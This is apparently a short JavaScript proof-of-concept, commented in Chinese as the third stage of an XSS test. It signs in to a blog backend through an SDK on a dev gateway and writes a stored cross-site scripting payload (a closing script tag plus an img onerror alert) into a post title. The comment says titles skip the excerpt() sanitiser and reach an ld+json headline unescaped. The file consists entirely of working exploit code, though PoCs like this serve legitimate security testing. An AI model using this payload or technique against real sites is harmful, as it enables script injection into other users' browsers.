// XSS PoC 第三阶段:标题不走 excerpt(),原样进 ld+json headline —— 完整闭合的注入
import { Torchwood } from '@torchwood/sdk'

const GATEWAY = 'https://torchwood-dev.deeploop.run'
const email = process.argv[2]
const password = process.argv[3]
const postId = process.argv[4]

const tw = Torchwood.create({ endpoint: GATEWAY, projectId: 'blog' })
const r = await tw.account.signIn({ email, password })
tw.setAccessToken(r.tokens.access_token)

const doc = await tw.databases.getDocument('app', 'posts', postId)
await tw.databases.updateDocument('app', 'posts', postId, {
  data: { title: 'PWN</script><img src=y onerror=alert(document.domain)>' },
  version: doc.version,
})
console.log('[update] title payload written')
